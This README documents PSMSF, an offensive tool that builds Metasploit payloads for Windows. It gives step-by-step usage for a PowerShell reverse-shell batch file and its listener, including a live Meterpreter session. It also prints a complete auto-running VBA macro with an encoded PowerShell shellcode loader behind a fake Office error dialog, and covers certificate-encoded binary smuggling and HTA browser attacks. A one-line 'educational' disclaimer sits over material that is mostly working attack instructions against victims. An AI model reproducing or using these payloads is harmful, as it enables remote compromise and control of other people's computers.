## PSMSF

**PSMSF** can help us generate payload or files used in cmd console/browser/.. with [**Metasploit-Framework**](https://github.com/rapid7/metasploit-framework/). If you are similar to windows cmd console, you can use the results in different areas.

**Note**: psmsf is just for the edutional purpose.


### **Requirement**

If you use [**Kali Linux**](https://www.kali.org), Install [**Metasploit-Framework**](https://www.metasploit.com/) with the command:

```
$ sudo apt-get install metasploit-framework
```


### **Usage**

**PSMSF** has following attack types,

- [x] powershell attack
- [x] vba macro Attack
- [x] cert attack
- [x] hta attack

```
psmsf [master] psmsf -h
Usage: python psmsf [options]

Options:
  -h, --help            show this help message and exit
  --attacktype=ATTACKTYPE
                        Attack Types are supported. (ps, crt, hta, mac)

  Powershell/Macro Attack:
    Generate metasploit console script / macro

    --payload=PAYLOAD   payload of metasploit framework
    --lhost=LHOST       lhost for payload of metasploit framework
    --lport=LPORT       lport for payload of metasploit framework

  CERT Attack:
    Translate a binary file into a text certification file, and restore
    the cert file to a binary file on target machines

    --filename=FILENAME
                        file to be encoded to a certification

  HTA Attack:
    Generate HTA html page. When victims access HTA page, os will be
    attacked from Internet Explorer

    --command=COMMAND   command of attack mode

  Output Direcroty:
    Write payload file or script to the destination directory

    --output=OUTPUT     please a output directory (not a file), default:
                        current directory
```

----

#### Powershell Attack Mode

```
psmsf [master] psmsf --attacktype ps
[+]
        ++++++
        +     +  ++++  +    +  ++++  ++++++
        +     + +      ++  ++ +      +
        ++++++   ++++  + ++ +  ++++  +++++
        +            + +    +      + +
        +       +    + +    + +    + +
        +        ++++  +    +  ++++  +

[+] Everything is now generated in two files, ex:
    powershell_hacking.bat - shellcode can be executed in cmd console.
                           - Usage: cmd.exe /c powershell_hacking.bat
    powershell_msf.rc      - msfconsole resource script.
                           - Usage: msfconsole -r powershell_msf.rc

[+] python psmsf.py --attacktype ps --payload windows/shell/reverse_tcp --lhost 192.168.1.100 --lport 8443
[+] python psmsf.py --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.100 --lport 8443
[+] python psmsf.py --attacktype ps --payload windows/meterpreter/reverse_http --lhost 192.168.1.100 --lport 8443
```

Everything is now generated in two files,

```
psmsf [master] psmsf --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.101 --lport 8443
[+] create msfconsole resource script
[+] create powershell shellcode command
```

If you want to output scripts to special destination directory, you can do it with the **```--output```** option.


```
psmsf [master] ./psmsf --attacktype ps --payload windows/shell/reverse_tcp --lhost 192.168.1.100 --lport 8443 --output /tmp
```

**Victim**

Please put the file **powershell_hacking.bat** to the victim's machine, and execute the shellcode with command.

```
cmd.exe /c powershell_hacking.bat
```

**Attacker**

Starts a **metasploit-framework** listeners,

```
psmsf [master] msfconsole -r powershell_msf.rc

# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v4.11.11-dev-95484c8                 ]
+ -- --=[ 1521 exploits - 884 auxiliary - 259 post        ]
+ -- --=[ 437 payloads - 38 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

[*] Processing powershell_msf.rc for ERB directives.
resource (powershell_msf.rc)> use exploit/multi/handler
resource (powershell_msf.rc)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (powershell_msf.rc)> set LHOST 192.168.1.101
LHOST => 192.168.1.101
resource (powershell_msf.rc)> set LPORT 8443
LPORT => 8443
resource (powershell_msf.rc)> set ExitOnSession false
ExitOnSession => false
resource (powershell_msf.rc)> set EnableStageEncoding true
EnableStageEncoding => true
resource (powershell_msf.rc)> exploit -j
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.1.101:8443
[*] Starting the payload handler...
msf exploit(handler) >
```

If you run **powershell_hacking.bat** on victim's machine, a new session will be created:

```
msf exploit(handler) > jobs

Jobs
====

  Id  Name                    Payload                          LPORT
  --  ----                    -------                          -----
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  8443

msf exploit(handler) >
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (958029 bytes) to 192.168.1.101
[*] Meterpreter session 1 opened (192.168.1.101:8443 -> 192.168.1.101:64656) at 2016-02-20 17:46:01 +0800

msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : SEC
OS              : Windows 7 (Build 7600).
```

----

#### Macro Attack Mode

Create a macro VBA for shellcode executation.

```
root@lab:/# psmsf --attacktype mac --payload windows/meterpreter/reverse_https --lhost 192.168.1.101 --lport 8443
[+] create msfconsole resource script
[+] create powershell shellcode command
[+]
Sub Auto_Open()
Dim x
x = "powershell -window hidden -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAYgBhACwAMAB4ADEAYgAsADAAeAAxADEALAAwAHgAZgA0ACwAMAB4AGYANwAsADAAeABkADkALAAwAHgAYwAxACwAMAB4AGQAOQAsADAAeAA3ADQALAAwAHgAMgA0ACwAMAB4AGYANAAsADAAeAA1AGUALAAwAHgAMwAzACwAMAB4AGMAOQAsADAAeABiADEALAAwAHgANQA3ACwAMAB4ADMAMQAsADAAeAA1ADYALAAwAHgAMQAzACwAMAB4ADgAMwAsADAAeABlAGUALAAwAHgAZgBjACwAMAB4ADAAMwAsADAAeAA1ADYALAAwAHgAMQA0ACwAMAB4AGYAMwAsADAAeAAwADEALAAwAHgAMABiACwAMAB4AGMAMgAsADAAeAA3ADEALAAwAHgAZQA5ACwAMAB4AGYANAAsADAAeAAxADIALAAwAHgAMQA2ACwAMAB4ADYAMwAsADAAeAAxADEALAAwAHgAMgAzACwAMAB4ADEANgAsADAAeAAxADcALAAwAHgANQAxACwAMAB4ADEAMwAsADAAeABhADYALAAwAHgANQAzACwAMAB4ADMANwAsADAAeAA5AGYALAAwAHgANABkACwAMAB4ADMAMQAsADAAeABhAGMALAAwAHgAMQA0ACwAMAB4ADIAMwAsADAAeAA5AGUALAAwAHgAYwAzACwAMAB4ADkAZAAsADAAeAA4AGUALAAwAHgAZgA4ACwAMAB4AGUAYQAsADAAeAAxAGUALAAwAHgAYQAyACwAMAB4ADMAOQAsADAAeAA2AGMALAAwAHgAOQBjACwAMAB4AGIAOQAsADAAeAA2AGQALAAwAHgANABlACwAMAB4ADkAZAAsADAAeAA3ADEALAAwAHgANgAwACwAMAB4ADgAZgAsADAAeABkAGEALAAwAHgANgBjACwAMAB4ADgAOQAsADAAeABkAGQALAAwAHgAYgAzACwAMAB4AGYAYgAsADAAeAAzAGMALAAwAHgAZgAyACwAMAB4AGIAMAAsADAAeABiADYALAAwAHgAZgBjACwAMAB4ADcAOQAsADAAeAA4AGEALAAwAHgANQA3ACwAMAB4ADgANQAsADAAeAA5AGUALAAwAHgANQBhACwAMAB4ADUAOQAsADAAeABhADQALAAwAHgAMwAwACwAMAB4AGQAMQAsADAAeAAwADAALAAwAHgANgA2ACwAMAB4AGIAMgAsADAAeAAzADYALAAwAHgAMwA5ACwAMAB4ADIAZgAsADAAeABhAGMALAAwAHgANQBiACwAMAB4ADAANAAsADAAeABmADkALAAwAHgANAA3ACwAMAB4AGEAZgAsADAAeABmADIALAAwAHgAZgA4ACwAMAB4ADgAMQAsADAAeABmAGUALAAwAHgAZgBiACwAMAB4ADUANwAsADAAeABlAGMALAAwAHgAYwBmACwAMAB4ADAAOQAsADAAeABhADkALAAwAHgAMgA4ACwAMAB4AGYANwAsADAAeABmADEALAAwAHgAZABjACwAMAB4ADQAMAAsADAAeAAwADQALAAwAHgAOABmACwAMAB4AGUANgAsADAAeAA5ADYALAAwAHgANwA3ACwAMAB4ADQAYgAsADAAeAA2ADIALAAwAHgAMABkACwAMAB4AGQAZgAsADAAeAAxADgALAAwAHgAZAA0ACwAMAB4AGUAOQAsADAAeABkAGUALAAwAHgAYwBkACwAMAB4ADgAMwAsADAAeAA3AGEALAAwAHgAZQBjACwAMAB4AGIAYQAsADAAeABjADAALAAwAHgAMgA1ACwAMAB4AGYAMAAsADAAeAAzAGQALAAwAHgAMAA0ACwAMAB4ADUAZQAsADAAeAAwAGMALAAwAHgAYgA1ACwAMAB4AGEAYgAsADAAeABiADEALAAwAHgAOAA1ACwAMAB4ADgAZAAsADAAeAA4AGYALAAwAHgAMQA1ACwAMAB4AGMAZQAsADAAeAA1ADYALAAwAHgAYgAxACwAMAB4ADAAYwAsADAAeABhAGEALAAwAHgAMwA5ACwAMAB4AGMAZQAsADAAeAA0AGYALAAwAHgAMQA1ACwAMAB4AGUANQAsADAAeAA2AGEALAAwAHgAMQBiACwAMAB4AGIAYgAsADAAeABmADIALAAwAHgAMAA2ACwAMAB4ADQANgAsADAAeABkADMALAAwAHgANgBhACwAMAB4ADcAYwAsADAAeAAwAGQALAAwAHgAMgAzACwAMAB4ADEAYgAsADAAeAAwADkALAAwAHgAOAA0ACwAMAB4ADQAZAAsADAAeABiADIALAAwAHgAYQAxACwAMAB4ADMAZQAsADAAeABkAGQALAAwAHgAMwAzACwAMAB4ADYAYwAsADAAeABiADgALAAwAHgAMgAyACwAMAB4ADYAZQAsADAAeAA0ADEALAAwAHgAMQBkACwAMAB4ADgAZgAsADAAeABjADIALAAwAHgAZgAxACwAMAB4AGYAMgAsADAAeAA3AGMALAAwAHgAOABkACwAMAB4AGMAZgAsADAAeABhADIALAAwAHgAZgBiACwAMAB4AGUAYQAsADAAeABjAGYALAAwAHgAOQBlACwAMAB4AGEAOAAsADAAeABhADcALAAwAHgANAA1ACwAMAB4ADIAMgAsADAAeAAxAGQALAAwAHgAMQBiACwAMAB4AGYAMgAsADAAeABkAGYALAAwAHgAOAAxACwAMAB4ADkAYgAsADAAeAAwADIALAAwAHgAYwA4ACwAMAB4ADQAZAAsADAAeAA5AGIALAAwAHgAMAAyACwAMAB4ADAAOAAsADAAeAA2ADIALAAwAHgAYQBlACwAMAB4ADQAMAAsADAAeAAzAGIALAAwAHgAMQAzACwAMAB4ADgAOAAsADAAeAA0ADQALAAwAHgANgBiACwAMAB4ADgAMwAsADAAeAA0ADMALAAwAHgAYwBjACwAMAB4ADEANAAsADAAeAA5ADUALAAwAHgAOQAzACwAMAB4ADEAYgAsADAAeABhADMALAAwAHgAZABmACwAMAB4ADMAZgAsADAAeABjAGMALAAwAHgAYgA0ACwAMAB4AGUAZAAsADAAeAA1AGYALAAwAHgAOAA4ACwAMAB4AGUANgAsADAAeAA0ADIALAAwAHgAZgAzACwAMAB4AGMANgAsADAAeAA1AGIALAAwAHgAMwAyACwAMAB4ADkAYgAsADAAeAAwADMALAAwAHgAMABlACwAMAB4ADkANAAsADAAeAA2ADAALAAwAHgAMgBiACwAMAB4ADYANAAsADAAeAA3AGUALAAwAHgAZgBjACwAMAB4AGQAOQAsADAAeABkADgALAAwAHgAMQA2ACwAMAB4ADgAMQAsADAAeABlAGQALAAwAHgAZQA2ACwAMAB4AGUANgAsADAAeAAwADgALAAwAHgAZgAxACwAMAB4ADgAZAAsADAAeABlADIALAAwAHgANQBhACwAMAB4ADkAOAAsADAAeAA0AGUALAAwAHgAYgBjACwAMAB4ADMAMgAsADAAeAAyADkALAAwAHgAMwA3ACwAMAB4AGQAZQAsADAAeAA0ADUALAAwAHgAMgBlACwAMAB4ADYAMgAsADAAeAA4AGQALAAwAHgAMQBhACwAMAB4ADgAMgAsADAAeABkAGUALAAwAHgANgA3ACwAMAB4AGYANQAsADAAeAAwADkALAAwAHgAZQA3ACwAMAB4ADkAZgAsADAAeAA3AGUALAAwAHgAYQBkACwAMAB4ADMAMgAsADAAeAAxAGEALAAwAHgANAAwACwAMAB4ADIANAAsADAAeABiADcALAAwAHgANgBiACwAMAB4ADMANAAsADAAeAAxAGUALAAwAHgAYQBmACwAMAB4ADgAMwAsADAAeAAwADMALAAwAHgAMAAyACwAMAB4ADYANgAsADAAeAA5AGMALAAwAHgAYgA5ACwAMAB4ADIAOQAsADAAeABjADcALAAwAHgAMABhACwAMAB4ADQAMgAsADAAeABiAGUALAAwAHgAYwA3ACwAMAB4AGMAYQAsADAAeAAyAGEALAAwAHgAYgBlACwAMAB4AGMANwAsADAAeAA4AGEALAAwAHgAYQBhACwAMAB4AGUAZAAsADAAeABhAGYALAAwAHgANQAyACwAMAB4ADAAZgAsADAAeAA0ADIALAAwAHgAZAA1ACwAMAB4ADkAZAAsADAAeAA5AGEALAAwAHgAZgA2ACwAMAB4ADQANgAsADAAeAAzADIALAAwAHgAYQBjACwAMAB4ADEAZQAsADAAeAAzAGYALAAwAHgAZABjACwAMAB4AGEAZQAsADAAeABjADAALAAwAHgAYwAwACwAMAB4ADEAYwAsADAAeABmAGMALAAwAHgANQA2ACwAMAB4AGEAOQAsADAAeAAwAGUALAAwAHgAOQA0ACwAMAB4AGQAZQAsADAAeABjAGIALAAwAHgAZAAxACwAMAB4ADQAZAAsADAAeAA2ADUALAAwAHgAYwBiACwAMAB4ADUAOQAsADAAeABhADMALAAwAHgAZQBkACwAMAB4AGMAYgAsADAAeABhADAALAAwAHgAZgA4ACwAMAB4ADcANwAsADAAeAAxADMALAAwAHgAZAA3ACwAMAB4ADEAYgAsADAAeAAyAGYALAAwAHgANQA3ACwAMAB4ADQAOAAsADAAeAAwAGMALAAwAHgAYQA1ACwAMAB4AGEAOAAsADAAeAA4ADkALAAwAHgAMwAzACwAMAB4ADcANwAsADAAeAA2AGUALAAwAHgANAA3ACwAMAB4AGUAMgAsADAAeAA0ADkALAAwAHgAYQA2ACwAMAB4ADkAZgAsADAAeABkADQALAAwAHgAOQA4ACwAMAB4AGUAOAAsADAAeABlAGUALAAwAHgAMQA4ACwAMAB4AGUAYQAsADAAeABmADQAOwAkAGcAIAA9ACAAMAB4ADEAMAAwADAAOwBpAGYAIAAoACQAegAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwAHgAMQAwADAAMAApAHsAJABnACAAPQAgACQAegAuAEwAZQBuAGcAdABoAH0AOwAkAHgAPQAkAHcAOgA6AFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgAMAAsADAAeAAxADAAMAAwACwAJABnACwAMAB4ADQAMAApADsAZgBvAHIAIAAoACQAaQA9ADAAOwAkAGkAIAAtAGwAZQAgACgAJAB6AC4ATABlAG4AZwB0AGgALQAxACkAOwAkAGkAKwArACkAIAB7ACQAdwA6ADoAbQBlAG0AcwBlAHQAKABbAEkAbgB0AFAAdAByAF0AKAAkAHgALgBUAG8ASQBuAHQAMwAyACgAKQArACQAaQApACwAIAAkAHoAWwAkAGkAXQAsACAAMQApAH0AOwAkAHcAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAMAAsADAALAAkAHgALAAwACwAMAAsADAAKQA7AGYAbwByACAAKAA7ADsAKQB7AFMAdABhAHIAdAAtAHMAbABlAGUAcAAgADYAMAB9ADsAJwA7ACQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAQgB5AHQAZQBzACgAJAAxACkAKQA7ACQAMgAgAD0AIAAiAC0AZQBuAGMAIAAiADsAaQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA4ACkAewAkADMAIAA9ACAAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAIAArACAAIgBcAHMAeQBzAHcAbwB3ADYANABcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsACIAOwBpAGUAeAAgACIAJgAgACQAMwAgACQAMgAgACQAZQAiAH0AZQBsAHMAZQB7ADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJAAyACAAJABlACIAOwB9AA=="
Shell ("POWERSHELL.EXE " & x)
Dim title As String
title = "Critical Microsoft Office Error"
Dim msg As String
Dim intResponse As Integer
msg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."
intResponse = MsgBox(msg, 16, title)
Application.Quit
End Sub
```

----

#### Cert Attack Mode

You can translate a binary file to a certificate file which is a text file.

```
psmsf [master] psmsf --attacktype crt --filename demo.exe
psmsf [master] ll cert_attack
total 48
-rw-r--r--  1 Open-Security  staff    44B Feb 20 21:31 cert_decode.bat
-rw-r--r--  1 Open-Security  staff    17K Feb 20 21:31 cert_encode.crt
```

Upload **cert_encode.crt** to victim machine, and restore it with windows batch script - **cert_decode.bat**.

----

#### HTA Attack Mode

Create windows hta web page, and you can access **http://demo.com/index.html** with Internet Explorer Browser.

```
psmsf [master] psmsf --attacktype hta --command whoami               
[+] create hta index file
[+] create hta module file
psmsf [master] ll windows_hta_attack
total 16
-rw-r--r--  1 Open-Security  staff   151B Feb 20 21:37 index.html
-rw-r--r--  1 Open-Security  staff   122B Feb 20 21:37 module.hta
```

## References

https://github.com/trustedsec/unicorn